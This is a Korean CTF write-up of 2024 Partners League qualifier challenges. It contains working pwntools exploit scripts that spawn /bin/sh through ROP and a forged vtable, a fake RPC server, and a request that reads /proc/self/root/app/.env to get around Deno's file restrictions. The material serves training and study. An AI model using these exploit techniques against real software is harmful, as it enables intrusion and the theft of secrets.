---
title: 2024 파트너스리그 예선전 풀이
description: 2024 파트너스리그 예선전 풀이입니다.
date: 2024-12-16 02:17:33 +0900
author: ipwn
tags: [Tech,CTF]
categories: [Tech, CTF]
math: true
mermaid: false
pin: false
image: /assets/img/2024partners-league-quals/2024-partners-league-qual.jpg
---

## 목차

1. Pwnable - yutnori
2. Pwnable - gfnote
3. Pwnable - master of wallet
4. Web - denostore
5. Web - Beta Test
6. Web - Rails on Rust
7. Reversing - waving
8. Reversing - OptimizeMe
9. Reversing - classic-is-the-best
10. Crypto - mnnm
11. Crypto - HalfHalf
12. Crypto - zkLabyrinth
13. Misc - hijacking
14. Misc - discord-check
15. Misc - CrackMe
16. Web3 - space-miner

---

## 1. Pwnable - yutnori

prob 바이너리만 제공됩니다. 컨셉은 연휴가 그리워서 추석에 걸맞게 윷놀이로 만들었습니다. 그런데, 이제 팜하니를 곁들인..

때문에 일반 윷놀이 판과 아래와 같이 조금 다릅니다.

1. 게임보드가 7x7로 이뤄져있습니다.
2. 말은 무조건 한 마리만 보드에 내보낼 수 있습니다.
3. 빽개가 추가됐습니다.
4. 게임 시작 위치와 진행방향도 조금 다릅니다.

이런 특성을 가진 윷놀이 게임에서 취약점을 찾고 exploit하는 문제입니다.

이해하기 쉽게 설명하기 위해 실제 코드로 설명하겠습니다.

```c
void printMap() 
{
    setMap();
    printStatus();
    puts("=====================");
    puts("=                   =");
    for(int i = 0; i < 7; ++i) {
        printf("=   ");
        for(int j = 0; j < 7; ++j) {
            switch(GAME_STATE.MAP[i][j]) {
                case empty:
                    printf("O");
                    break;
                case player:
                    printf("P");
                    break;
                case computer:
                    printf("C");
                    break;
                case fast_way:
                    printf("◎");
                    break;
                case space:
                    printf(" ");
                    break;
                default:
                    error("GAME_STATE.MAP ERROR.");
            }
            if(j != 6) printf(" ");
        }
        puts("   =");
    }
    puts("=                   =");
    puts("=====================");

    if (GAME_STATE.GOAL_CNT[player_turn] >= 5) {
        printFlag();
    }
}
```

`printMap` 함수는 `GOAL_CNT[player_turn]`가 5 이상일 경우에 flag를 출력해줍니다. 하지만 게임의 전체 로직 상, 게임 말은 4개밖에 존재하지 않아서 정상적인 방법으로는 이 조건을 달성할 수가 없습니다. 

```c
yut randomYut(turn t) 
{
    int num = rand() % 7 + 1;
    switch(num) {
        case _do:
            puts("도!!!");
            break;
        case _gae:
            puts("개!!!");
            break;
        case _girl:
            puts("걸!!!");
            break;
        case _yut:
            puts("윷!!!");
            break;
        case _mo:
            puts("모!!!");
            break;
        case _backdo:
            puts("빽-도!!!");
            break;
        case _backgae: {
            if(t != cpu_turn) printHanni();
            else puts("???!!");
        } break;
        default:
            printf("%d\n", num);
            error("RANDOM_YUT ERROR");
    }
    return num;
}
```

`randomYut`함수를 보면, 빽개가 추가되어있음을 확인할 수 있고, 윷을 굴려서 이 빽개가 뜨게 되면 뜬겁새로 팜하니의 아스키아트가 함께 출력됩니다.

```c
void moving(turn t, int step) 
{
    for(int i = 0; i < step; ++i) {
        if(GAME_STATE.PIECES[t][GAME_STATE.ORD_OF_PIECE[t]] == yet) {
            GAME_STATE.X[t]++;
            GAME_STATE.PIECES[t][GAME_STATE.ORD_OF_PIECE[t]] = in_board;
            continue;
        }
        if(GAME_STATE.Y[t] == 0) {
            if(GAME_STATE.X[t] == 6) {
                if(GAME_STATE.GO_FAST_WAY[t]) {
                    GAME_STATE.GO_FAST_WAY[t] = false;
                    GAME_STATE.PX[t] = GAME_STATE.X[t]--;
                }
                GAME_STATE.PY[t] = GAME_STATE.Y[t]++;
            } else if(GAME_STATE.X[t] == 0) {
                GAME_STATE.X[t] = GOAL_X;
                GAME_STATE.Y[t] = GOAL_Y;
                GAME_STATE.PX[t] = GAME_STATE.PY[t] = 0;
                break;
            } else if(GAME_STATE.X[t] > 0 && GAME_STATE.X[t] < 6) {
                GAME_STATE.PX[t] = GAME_STATE.X[t]++;
            } else {
                error("YUT POSITION ERROR");
            }
        } else if (GAME_STATE.Y[t] == 6) {
            if(GAME_STATE.X[t] == 0) {
                GAME_STATE.PY[t] = GAME_STATE.Y[t]--;
            } else if (GAME_STATE.X[t] == 6) {
                if(GAME_STATE.GO_FAST_WAY[t]) {
                    GAME_STATE.GO_FAST_WAY[t] = false;
                    GAME_STATE.PY[t] = GAME_STATE.Y[t]--;
                }  
                GAME_STATE.PX[t] = GAME_STATE.X[t]--;
            } else if (GAME_STATE.X[t] > 0 && GAME_STATE.X[t] < 6) {
                GAME_STATE.PX[t] = GAME_STATE.X[t]--;
            } else {
                error("YUT POSITION ERROR");
            }
        } else if (GAME_STATE.Y[t] > 0 && GAME_STATE.Y[t] < 6) {
            if(GAME_STATE.X[t] == 0) {
                GAME_STATE.PY[t] = GAME_STATE.Y[t]--;
            } else if(GAME_STATE.X[t] == 6) {
                GAME_STATE.PY[t] = GAME_STATE.Y[t]++;
            } else {
                if(GAME_STATE.X[t] == GAME_STATE.Y[t]) {
                    if(GAME_STATE.X[t] == 3) {
                        if(GAME_STATE.PX[t] == GAME_STATE.PY[t] || GAME_STATE.GO_FAST_WAY[t]) {
                            GAME_STATE.PY[t] = GAME_STATE.Y[t]--;
                        } else {
                            GAME_STATE.PY[t] = GAME_STATE.Y[t]++;
                        }
                    } else {
                        GAME_STATE.PY[t] = GAME_STATE.Y[t]--;
                    }
                    GAME_STATE.PX[t] = GAME_STATE.X[t]--;
                } else if(GAME_STATE.X[t] + GAME_STATE.Y[t] == 6) {
                    GAME_STATE.PX[t] = GAME_STATE.X[t]--;
                    GAME_STATE.PY[t] = GAME_STATE.Y[t]++;
                } else {
                    error("YUT POSITION ERROR");
                }
            }
        } else {
            error("YUT POSITION ERROR");
        }
    }
}
```
또한 도, 개, 걸, 윷, 모의 경우처럼 정방향으로 움직일 때 호출되는 `moving`함수를 보게 되면, step의 수만큼 반복하여 한 step씩 움직이는 걸 확인할 수 있습니다.

```c
void backMoving(turn t, int step) 
{
    step *= -1;

    if(GAME_STATE.Y[t] == 0) {
        if(GAME_STATE.X[t] == 0) {
            GAME_STATE.PY[t] = GAME_STATE.Y[t];
            GAME_STATE.Y[t] += step;
        } else if(GAME_STATE.X[t] > 0 && GAME_STATE.X[t] <= 6) {
            GAME_STATE.PX[t] = GAME_STATE.X[t];
            GAME_STATE.X[t] -= step;
        } else {
            error("YUT POSITION ERROR");
        }
    } else if (GAME_STATE.Y[t] == 6) {
        if (GAME_STATE.X[t] == 6) {
            GAME_STATE.PY[t] = GAME_STATE.Y[t];
            GAME_STATE.Y[t] -= step;
        } else if (GAME_STATE.X[t] >= 0 && GAME_STATE.X[t] < 6) {
            GAME_STATE.PX[t] = GAME_STATE.X[t];
            GAME_STATE.X[t] += step;
        } else {
            error("YUT POSITION ERROR");
        }
    } else if (GAME_STATE.Y[t] > 0 && GAME_STATE.Y[t] < 6) {
        if(GAME_STATE.X[t] == 0) {
            GAME_STATE.PY[t] = GAME_STATE.Y[t];
            GAME_STATE.Y[t] += step;
        } else if(GAME_STATE.X[t] == 6) {
            GAME_STATE.PY[t] = GAME_STATE.Y[t];
            GAME_STATE.Y[t] -= step;
        } else {
            if(GAME_STATE.X[t] == GAME_STATE.Y[t]) {
                GAME_STATE.PY[t] = GAME_STATE.Y[t];
                GAME_STATE.PX[t] = GAME_STATE.X[t];
                GAME_STATE.Y[t] += step;
                GAME_STATE.X[t] += step;
            } else if(GAME_STATE.X[t] + GAME_STATE.Y[t] == 6) {
                GAME_STATE.PX[t] = GAME_STATE.X[t];
                GAME_STATE.PY[t] = GAME_STATE.Y[t];
                GAME_STATE.X[t] += step;
                GAME_STATE.Y[t] -= step;

            } else {
                error("YUT POSITION ERROR");
            }
        }
    } else {
        error("YUT POSITION ERROR");
    }
}
```

빽도와 빽개가 나와서 역방향으로 움직일 때 호출되는 `backMoving`함수를 보면 step을 반복하는 게 아니라 단순히 그 값만큼 더하고 빼고 있음을 알 수 있습니다.
이는 빽도만 존재할 때에는 문제가 없지만, 경계의 바로 한 칸 앞에 말이 있는 경우에 빽개가 나오게 되면 x와 y좌표가 경계를 벗어나게 될 여지가 있습니다.

```c
void setMap() 
{
    for(int i = 0; i < 7; ++i) {
        for(int j = 0; j < 7; ++j) {
            GAME_STATE.MAP[i][j] = space;
        }
    }

    for(int i = 0; i < 7; ++i) {
        GAME_STATE.MAP[i][0] = empty;
        GAME_STATE.MAP[0][i] = empty;
        GAME_STATE.MAP[i][6] = empty;
        GAME_STATE.MAP[6][i] = empty;
    }
    for(int i = 0; i < 7; ++i) {
        GAME_STATE.MAP[i][i] = fast_way;
        GAME_STATE.MAP[i][6-i] = fast_way;
    }

    if(GAME_STATE.PIECES[player_turn][GAME_STATE.ORD_OF_PIECE[player_turn]] == in_board) GAME_STATE.MAP[GAME_STATE.Y[player_turn]][GAME_STATE.X[player_turn]] = player;
    if(GAME_STATE.PIECES[cpu_turn][GAME_STATE.ORD_OF_PIECE[cpu_turn]] == in_board) GAME_STATE.MAP[GAME_STATE.Y[cpu_turn]][GAME_STATE.X[cpu_turn]] = computer;
}
```

또한 setMap함수가 호출될 때, MAP array에 X, Y 좌표에 따라 값이 삽입되는데, 이 때, MAP의 다음 혹은 이전 변수의 값이 덮어씌워질 수 있습니다.

```c
typedef struct {
    int X[2], Y[2];
    int PX[2], PY[2];
    piece_state PIECES[2][4];
    int ORD_OF_PIECE[2];
    int GOAL_CNT[2];
    board MAP[7][7];
    bool IS_BONUS;
    bool GO_FAST_WAY[2];
} game_state;

typedef enum {
    space = 0,
    empty,
    computer,
    player,
    fast_way,
} board;

typedef enum {
    cpu_turn = 0,
    player_turn,
} turn;
```

그런데, MAP array의 바로 직전에는 GOAL_CNT array가 존재하며, 앞서 언급했듯 `printMap` 함수에서는 `GOAL_CNT[player_turn]`이 5 이상일 경우에 flag를 출력해줍니다.

열거형을 확인해보면, `player_turn`은 값이 1이고, `player`는 값이 3입니다. 이 점을 토대로 생각해보면 oob를 통해서 `GOAL_CNT[player_turn]`을 덮어씌울 수 있고, 즉, 해당 값을 5 이상으로 설정할 수 있게 됩니다.

exploit은 간단합니다.

내 턴에 도를 뽑은 이후 바로 빽개를 뽑으면 (게임 상 낙을 플레이어 마음대로 조절할 수 있으므로 이 상황은 쉽게 만들어낼 수 있습니다.) `GOAL_CNT[player_turn]`가 4로 바뀌고, 정상적인 방법으로 한 번 더 내 말을 골인 시키면 flag가 출력됩니다.

바이너리에 `sleep`이 많기 때문에 아래 스크립트를 실행시키고 잠시 기다리면 flag를 높은 확률로 획득할 수 있습니다.

```py
from pwn import *

e = ELF('./prob')
p = e.process()

DO = bytes("도!!!", 'utf-8')
GAE = bytes("개!!!", 'utf-8')
GIRL = bytes("걸!!!", 'utf-8')
YUT = bytes("윷!!!", 'utf-8')
MO = bytes("모!!!", 'utf-8')
BACK_DO = bytes("빽-도!!!", 'utf-8')
BACK_GAE = bytes("이런거는 뜬겁새로..", 'utf-8')
GOAL = bytes("뽀이뽀이 여러분~ 후두다닥", 'utf-8')

while True:
    buf = p.recvuntil(b'(y/n):').split(b'\n')[-2]
    if buf == DO:
        p.sendline(b'n')
        break
    p.sendline(b'y')

log.success("== [DO] ==")

while True:
    buf = p.recvuntil(b'(y/n):').split(b'\n')[-2]
    if buf == BACK_GAE:
        p.sendline(b'n')
        break
    p.sendline(b'y')

log.success("== [OOB] ==")

while True:
    p.sendlineafter(b'(y/n):', b'n')
    buf = p.recvuntil(b'CPU:')
    if GOAL in buf:
        break

p.interactive()
```

## 2. Pwnable - gfnote


모든 보호기법이 걸려있고, 심볼이 제거되어있으며 ubuntu 24.04 환경에서 컴파일 됐습니다.
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```c
void read_data(char *buf) {
  safe_read(buf, 0x100);
}

void write_data(char *buf) {
  int d = safe_read_num();
  const int delta = 0x28;
  if (d % 8 != 0 || delta > d)
    return;
  printf("%lx\n", crc64(buf - 0x40, d));
}
```

해당 프로그램은 `read_data` 라는 함수로 입력을 받는데, OOB 취약점이 존재합니다. 즉, 허용된 크기보다 더 멀리 있는 메모리를 읽을 수 있지만, 이때 읽은 데이터의 Entropy를 모르는 상황입니다.

반대로` write_data` 라는 함수는 leak 시키는 기능을 하지만, 직접 데이터를 볼 수 있는 것이 아니라 스택 버퍼의 CRC64 값만 확인 가능합니다. 즉, 원본 데이터를 볼 수 없고 해당 데이터의 CRC64 체크섬만 얻을 수 있습니다.

Canary 주소와, 라이브러리 주소를 leak하고, system call을 통해 쉘을 획득하면 됩니다.

```py
import pwn

IP, PORT = "192.168.77.2", int(15557)

p = 0x42F0E1EBA9EA3693

def preprocess():
    R.<y> = GF(2 ** 64)
    P = PolynomialRing(GF(2), 'x')
    modulus = P(R.from_integer(p))
    F = PolynomialRing(GF(2), ["x"] + [f"a{i}" for i in range(64)])
    F.inject_variables()
    gens = F.gens()
    A = [gens[i + 1] for i in range(64)]
    modulus += x ** 64
    f = sum(A[i] * x ** i for i in range(64))
    f *= x ** 64
    f = f % modulus
    coeff_dict = {}
    for i in range(1,64):
        coeff = f.coefficient(x ** i)
        coeff_dict[i] = coeff
        f -= coeff * x ** i
    coeff_dict[0] = f
    M = []
    for i in range(64):
        coeff = coeff_dict[i]
        row = [coeff.coefficient(a) for a in A]
        assert len(row) == 64
        M.append(row)
    M = Matrix(GF(2), M)
    assert M.determinant() == 1
    return M.inverse()

M_inv = preprocess()

io = pwn.remote(IP, PORT)
# pwn.context.log_level = "DEBUG"
pwn.context.arch = "x86_64"


"""
gef➤  x/10gx $rdi
0x7fffffffdd90: 0x00007fffffffddc0      0x00005555555553da
0x7fffffffdda0: 0x00007fffffffdf28      0x00007fffffffddd0
0x7fffffffddb0: 0x0000555555557d90      0x0000002800000040
0x7fffffffddc0: 0x00007fffffffde00      0x000055555555546b
0x7fffffffddd0: 0x0000000000000000      0x0000000000000000
0x7fffffffdde0: 0x0000000000000000      0x0000000000000000
0x7fffffffddf0: 0x00007fffffffdf28      0x46a64fd70c389600
0x7fffffffde00: 0x00007fffffffde10      0x00005555555554f1
0x7fffffffde10: 0x0000000000000001      0x00007ffff7db3d90
"""

def read(msg: bytes):
    io.sendlineafter(b"Choose >\n", b"1")
    io.send(msg)

def write(d: int):
    io.sendlineafter(b"Choose >\n", b"2")
    io.sendline(str(d).encode())
    return int(io.recvline(keepends=False), 16)

def crc(data, crc_base=0):
    crc = crc_base
    for byte in data:
        crc ^^= byte << (64 - 8)
        for _ in range(8):
            if crc & (1 << 63):
                crc = (crc << 1) ^^ p
            else:
                crc <<= 1
    return crc & 0xFFFFFFFF_FFFFFFFF

def crc_rev(target_raw: int, base=0):
    target = vector(GF(2), [(target_raw & (1 << i)) >> i for i in range(64)])
    result = base
    recovered = M_inv * target
    for i in range(len(recovered)):
        result ^^= Integer(recovered[i]) * (1 << i)
    return result

leak_0x28 = write(0x28)
leak_0x30 = write(0x28 + 8)
leak_0x38 = write(0x28 + 8 * 2)
leak_0x40 = write(0x28 + 8 * 3)
assert leak_0x30 == crc(pwn.p32(0x28 + 8) + pwn.p32(0x28), leak_0x28)

base_data = pwn.p32(0x28 + 8 * 2) + pwn.p32(0x28)
stack_leak_big_endian = crc_rev(leak_0x38, base=crc(base_data, leak_0x28))
stack_leak = pwn.u64(pwn.p64(stack_leak_big_endian)[::-1])
pwn.log.info(f"stack_leak leak = {hex(stack_leak)}")

base_data = pwn.p32(0x28 + 8 * 3) + pwn.p32(0x28) + pwn.p64(stack_leak)
pie_leak_big_endian = crc_rev(leak_0x40, base=crc(base_data, leak_0x28))
pie_leak = pwn.u64(pwn.p64(pie_leak_big_endian)[::-1])
pwn.log.info(f"pie leak = {hex(pie_leak)}")

dummy_data = b"A" * 0x28
read(dummy_data)
leak_0x70 = write(0x70)
base_data = pwn.p32(0x70) + pwn.p32(0x28)
base_data += pwn.p64(stack_leak) + pwn.p64(pie_leak)
base_data += dummy_data
canary_leak_big_endian = crc_rev(leak_0x70, base=crc(base_data, leak_0x28))
canary_leak = pwn.u64(pwn.p64(canary_leak_big_endian)[::-1])
pwn.log.info(f"canary leak = {hex(canary_leak)}")
assert canary_leak & 0xFF == 0, "invalid canary null armor"

def leak_helper(idx):
    diff = 8 * idx
    dummy_data = b"A" * (0x28 + diff)
    read(dummy_data)
    leak_base = write(0x70 + diff)
    base_data = pwn.p32(0x70 + diff) + pwn.p32(0x28)
    base_data += pwn.p64(stack_leak) + pwn.p64(pie_leak)
    base_data += dummy_data
    leak_big_endian = crc_rev(leak_base, base=crc(base_data, leak_0x28))
    leak = pwn.u64(pwn.p64(leak_big_endian)[::-1])
    return leak

libc_leak = leak_helper(4)
pwn.log.info(f"libc leak = {hex(libc_leak)}")
libc_base = libc_leak - 0x00007fd12c32f1ca + 0x00007fd12c305000
pwn.log.info(f"libc base = {hex(libc_base)}")
assert libc_base & 0xFFF == 0, "libc base page unaligned"

libc = pwn.ELF("./libc.so.6", checksec=False)
pop_rdi_pop_rbp_ret = libc_base + 0x000000000002a873
libc_bin_sh = libc_base + list(libc.search(b"/bin/sh"))[0]
libc_system = libc_base + libc.symbols["system"]
pwn.log.info(f"pop rdi pop rbp ret = {hex(pop_rdi_pop_rbp_ret)}")
pwn.log.info(f"libc bin sh = {hex(libc_bin_sh)}")
pwn.log.info(f"libc system = {hex(libc_system)}")

payload = b"A" * 0x28 + pwn.flat(
    int(canary_leak),
    b"A" * 8,
    # ret addr
    int(pop_rdi_pop_rbp_ret), # stack alignment via 0x10
    int(libc_bin_sh),
    b"A" * 8,
    int(libc_system),
)
read(payload)

# exit and shell
io.sendlineafter(b"Choose >\n", b"3")
io.sendline("cat /home/gfnote/flag")

flag = io.recvn(39).decode()
assert "hspace{divide_well_recover_well_9af346}" == flag
pwn.log.success(f"{flag = }")

io.close()
```

## 3. Pwnable - master of wallet

`server.py`, `libWallet.so` 두 개의 파일이 주어집니다. server.py 에서 `libWallet.so` 의 함수들을 cdll 으로 import 해오거나, 함수포인터 배열의 인덱스로 함수를 호출해 사용자가 지정한 rpc와 상호작용할 수 있습니다.

```python
elif choice == '5':
    account_index = int(input("Enter account index: "))
    to = input("Enter recipient address: ")
    value = input("Enter amount in wei: ")
    data = input("Enter call data (use @index,rest_of_data for calldata): ")
    index = data[1:data.index(',')]
    if int(index) < 0:
        index = 0
    result = wallet.send_transaction(account_index, to, value, data)
```
eth_call 을 수행할 때, calldata index 를 입력받는데 이때 음수인지 검사를 합니다.

```c++
if (!currentData.empty() && currentData[0] == '@') {
    int calldataIndex = std::stol(currentData.substr(1));
    fullData = "0x" + getCalldata(calldataIndex) + currentData.substr(currentData.find_first_of(',') + 1);
}
...

std::string getCalldata(int index) {
    if (index >= calldataCount) {
        return "";
    }
    std::stringstream ss;
    ss << std::hex << std::setfill('0') << std::setw(8) << calldata[index];
    return ss.str();
}

void editCalldata(int index, uint32_t newData) {
    if (index >= calldataCount) {
        return;
    }
    calldata[index] = newData;
}
```
모듈에서는 음수검사를 따로 하지 않습니다. 파이썬에서 msb 가 1인 큰 수를 전달한다면, `calldataIndex` 가 음수로 변환되어 calldata 아래에 주소에 있는 값들을 읽을 수 있게 됩니다.
이걸로 heap & libc leak이 가능합니다. libc는 libWallet 라이브러리가 로딩된 주소라서 오프셋 계산해서 맞출 수 있습니다. 다만, calldata는 유저에게 직접적으로 리턴되지 않고, rpc call의 인자로 날라가기 떄문에 fake server 하나 돌려서 calldata를 리턴하게 해야합니다.
editCalldata 함수에서도 마찬가지로 클래스 객체 내에서 oob read/write가 가능합니다.

```
$rax   : 0x00007f1a392299d3  →   mov DWORD PTR [rdi+0x10], esp
$rbx   : 0x00007ffe1e107f20  →  0x0000000200000002
$rcx   : function vtable     
$rdx   : 0x000055d9b9f0a310  →  function vtable  
$rsp   : 0x00007ffe1e107cd0  →  0x00000000392e30a0
$rbp   : 0x00007ffe1e107ce0  →  0x00007ffe1e107d00  →  0x00007ffe1e107d10  →  0x0000000000000007
$rsi   : function vtable  
$rdi   : 0x000055d9b9f0a310  →  function vtable  
$rip   : 0x00007f1a389f7a86  →  0x60058d4807ebd0ff
$r8    : 0x00007f1a38b04f90  →  0x0000000000000001
$r9    : 0x00007f1a392e37aa  →   sub DWORD PTR [rbp+0x20], 0x1
$r10   : 0x0
$r11   : 0x00007f1a389f1404  →  0x10ec8348e5894855
$r12   : 0x0
$r13   : 0x00007ffe1e107dc0  →  0x0000000000000002
$r14   : 0x00007ffe1e107e30  →  0x00007ffe1e107e90  →  0x00007f1a38abf6d0  →  0x0000000000000004
$r15   : 0x00007ffe1e107dbc  →  0x0000000200000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f1a389f7a80                  mov    rax, QWORD PTR [rax]
   0x7f1a389f7a83                  mov    rsi, QWORD PTR [rsi]
 → 0x7f1a389f7a86                  call   rax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x7f1a392299d3 (
   $rdi = 0x000055d9b9f0a310 → function vtable
   $rsi = function vtable
   $rdx = 0x000055d9b9f0a310 → function vtable
)
```

다음은 인덱스로 함수를 호출할 때의 상황입니다. rdi, rdx 값은 각각 클래스 객체 주소값을 나타내고있고, rsi 는 가장 첫번째 멤버인 vtable 을 나타내고 있습니다. vtable 주소를 변조시킴으로써 원하는 함수를 호출할 수 있게 됩니다. 하지만 원샷 조건이 안맞고, rdi가 vtable을 가리키고 있기 때문에 다른가젯을 사용해야 합니다.

> 0x001279d3: mov rdi, rsi; mov rax, [rdi+8]; mov rsi, [r8+0x40]; mov edx, [rsi+0x1c8]; add rsi, 0x38; jmp qword ptr [rax+0x18];

가젯을 찾다보면, 조건에 부합하는 가젯을 찾을 수 있습니다. rsi 값(vtable)을 rdi 에 넣은 뒤, vtable+8 -> rax, `vtable+0x18` 여기있는 주소를 참조해 호출하게 됩니다.
클래스 객체 주소를 leak 할 수 있으니 fake vtable 을 구성하여 가젯을 `system("/bin/sh")` 으로 맞춰주면 됩니다. fake table은 `class+0x3f4` 에 위치한 calldata array으로 사용합니다.

solve.py
```python
r = remote("localhost", 8546)
lib = ELF("./libc-2.31.so")
# r = process("")
# context.log_level = 'debug'
r.sendlineafter("Enter RPC URL: ", "http://snwo.kr:5000")
r.sendlineafter("Choose an option: ", "1")
r.sendlineafter("Enter private key: ", "0x0")
r.sendlineafter("Enter public key: ", "0x0")

for i in range(4*5):
    r.sendlineafter("Choose an option: ", "12")
    r.sendlineafter("Enter 4-byte calldata (as hex string): ", "0x11111111")

leaks = []
for i in range(0,0x10,2):
    idx = -(0x3f4 // 4) & ((1<<32)-1)
    idx += i
    r.sendlineafter("Choose an option: ", "3")
    r.sendlineafter("Enter account index: ", "0")
    r.sendlineafter("Enter contract address: ", "0x0")
    r.sendlineafter(": ",f"@{idx},")
    r.recvuntil("eth_call result: ")
    low_32 = int(r.recvline().strip(),16)
    r.sendlineafter("Choose an option: ", "3")
    r.sendlineafter("Enter account index: ", "0")
    r.sendlineafter("Enter contract address: ", "0x0")
    r.sendlineafter(": ",f"@{idx+1},")
    r.recvuntil("eth_call result: ")
    high_32 = int(r.recvline().strip(),16)
    leak = low_32 + (high_32 << 32)
    print(i//2,hex(leak))
    leaks.append(leak)

libc_base = leaks[0] - 0xc4920 + 0x78c000
# libc_base = leaks[0] - 0xc4920 + 0x644000
class_base = leaks[5] - 0x38
array_base = class_base+0x3f4
system = libc_base + lib.sym['system']
gadget = libc_base + 0x001279d3
oneshot = libc_base + 0xc8300
print("libc",hex(libc_base))
print("class",hex(class_base))


def edit(idx, value):
    r.sendlineafter(": ","13")
    r.sendlineafter(": ", str(idx))
    r.sendlineafter(": ", hex(value&0xffffffff))
    r.sendlineafter(": ","13")
    r.sendlineafter(": ", str(idx+1))
    r.sendlineafter(": ", hex((value>>32)&0xffffffff))

## vtable address
edit(-(0x3f4 // 4) & ((1<<32)-1), array_base-0x10)
edit((-(0x3f4 // 4) & ((1<<32)-1))+2, array_base)

## fake vtable
edit(-4, int.from_bytes(b"/bin/sh\x00", "little"))
edit(-2, array_base-0x8)
edit(0, gadget)
edit(4, system)

r.sendlineafter(": ", "1")
r.sendlineafter(": ", "0")
r.sendlineafter(": ", "0")
r.interactive()
```

fake_server.py
```python
from flask import Flask, request, jsonify
import json
app = Flask(__name__)

@app.route("/",methods=["POST"])
def handler():
    data = request.json
    calldata = data['params'][0]['data']
    return jsonify({"result":calldata})

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=5000)
```

## 4. Web - denostore

기본적으로 hono와 deno kv 라이브러리를 이용한 간단한 상점 웹사이트인 것을 알 수 있습니다.

```js
export async function buyItem(username, item, quantity) {
    const user = (await getUser(username)).value;
    const store = (await getStore(username)).value;
    const itemPrice = STORE_LIST.find((i) => i.name === item).price;

    if (!store[item]) {
        store[item] = 0;
    }

    if (user.balance < itemPrice * quantity) {
        throw new Error("Not enough balance");
    }

    store[item] += parseInt(quantity);
    user.balance -= itemPrice * parseInt(quantity);

    await kv.set(["store", username], store);
    await kv.set(["users", username], user);
}

export async function sellItem(username, item, quantity) {
    const user = (await getUser(username)).value;
    const store = (await getStore(username)).value;
    const itemPrice = STORE_LIST.find((i) => i.name === item).price;

    if (!store[item] || store[item] < quantity) {
        throw new Error("Not enough items");
    }

    store[item] -= parseInt(quantity);
    user.balance += itemPrice * parseInt(quantity);

    await kv.set(["users", username], user);
    await kv.set(["store", username], store);
}
```

아이템 구매와 판매를 할 때, 먼저 user.balance를 보고 나중에 저장을 하기 때문에 매우 빠르게 구매 요청을 보내면 race condition을 통해 돈 복사가 가능합니다.

```js
app.get("/flag", async (c) => {
    const session = c.get("session");
    const username = session.get("username");

    if (!username) {
        return c.text("You are not logged in");
    }

    const store = await getStore(username);

    if (store.value["Flag"] > 0) {
        const flag = Deno.env.get("FLAG");
        return c.text(flag);
    }

    return c.text("You are not authorized to view the flag");
});
```

얼핏보면 돈을 모아 Flag 아이템을 산 뒤 `/flag`에 접근하면 플래그를 획득할 수 있는 것 처럼 보입니다.
하지만, 도커 파일을 보면 `--deny-env=FLAG`가 걸려있어 바로 환경 변수에 접근을 하지 못하는 것을 알 수 있습니다.

```js
pp.get("/readfile", async (c) => {
    const session = c.get("session");
    const username = session.get("username");

    const filepath = c.req.query("file");

    if (!username) {
        return c.text("You are not logged in");
    }

    if (!filepath) {
        return c.text("Invalid file path");
    }

    const user = await getUser(username);
    if (user.value.balance < 1000000) {
        return c.text("Not enough balance");
    }

    const file = Deno.readTextFileSync(filepath);
    return c.text(file);
});

```

하지만, 밑에 readfile 기능이 주어졌기 때문에 이 기능으로 환경 변수를 읽을 수 있는 방법도 있다는 것을 알 수 있습니다.
이것 또한 `--deny-read=/proc/self/environ,.env`로 막혀있으나, `/proc/self/root/app/.env` 등과 같이 sandbox를 우회하면 플래그를 읽을 수 있습니다.

따라서, 최종 익스플로잇은 다음과 같습니다.

```py
import requests

# Server URL
BASE_URL = "http://localhost:8000"  # Replace with your actual server URL

# User credentials
USERNAME = "kitae3"
PASSWORD = "123"

# 1. Login user and share session
def login_user(username, password):
    url = f"{BASE_URL}/login"
    payload = {"username": username, "password": password}
    #payload = f"username={username}&password={password}"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    # Create a session object for session sharing across requests
    session = requests.Session()
    response = session.post(url, data=payload, headers=headers)
    print(session.headers)
    
    if response.status_code == 200:
        print(f"Logged in as {username}.")
        print(response.text)
        return session
    else:
        print("Login failed:", response.text)
        return None


def readfile(session, file):
    url = f"{BASE_URL}/readfile"
    payload = {"file": file}
    response = session.get(url, params=payload)
    print(response.text)

# Main script execution using session sharing
if __name__ == "__main__":
    # Login and get the session
    session = login_user(USERNAME, PASSWORD)

    if session:
        # Read the file
        readfile(session, "/proc/self/root/app/.env")
```

## 5. Web - Beta Test

접속하면 VLD로 덤프한 PHP Zend Opcode를 볼 수 있다. 이를 리버싱 하면 AES와 비트 쉬프트, mod 연산, rot13이 섞여있는 암호화 로직이라는 것을 알 수 있다.

실제로 Zend Opcode 상에 CBC Mode에서 사용하는 암호문, IV, Key가 모두 적혀있기 때문에 플레이어가 원본 코드를 복구하기만 하면, flag를 연산할 수 있다.


## 6. Web - Rails on Rust
Actix framework를 활용한 web backend 바이너리 리버싱 문제입니다.

Frontend (SvelteKit) <-> Backend (Rust) <-> Redis의 구조로 돌아가는 서비스로,  Rust 바이너리를 분석하면 다음과 같은 endpoint들을 찾을 수 있습니다.

**구조**

- / : Health Check

Backend Health Check

- /signin : 로그인(signin 할 경우, redis에 key가 존재하는지 확인하고, value와 password가 일치하는지 확인한다.)

- /signup : 회원 가입(signup 할 경우, redis에 username을 key로, password를 value로 저장한다.)

- /flag : Flag claim

signin하여 발급된 jwt토큰을 Authorization헤더로 보낼 경우, 유효성을 검사합니다. 이후, admin role을 가지고 있는지 검증하고, 가지고 있을 경우 flag를 제공합니다.

admin role 검증 부분을 보면, `유저네임_role`을 조회하여 role|admin을 value로 가지는지 검증합니다. 여기서 재밌는 점이, 해당 서비스는 frontend에서 password를 hashing하여 보내주고, backend에서는 추가적인 hash를 거치지 않습니다. 따라서, 서비스를 이용하여 가입할 경우 redis 자체에는 hash값으로 들어가는 것으로 보입니다.

여기서 로직 버그가 발생하는데, hash를 백엔드에서 추가적으로 거치지 않기 때문에 공격자는 redis에 원하는 키 / 원하는 value를 기록할 수 있습니다. 이를 이용하여 `유저네임_role`을 `role|admin`으로 회원가입하고, 유저로 로그인한 jwt를 `/flag` 엔드포인트에 보내주면 플래그를 얻을 수 있게 됩니다.

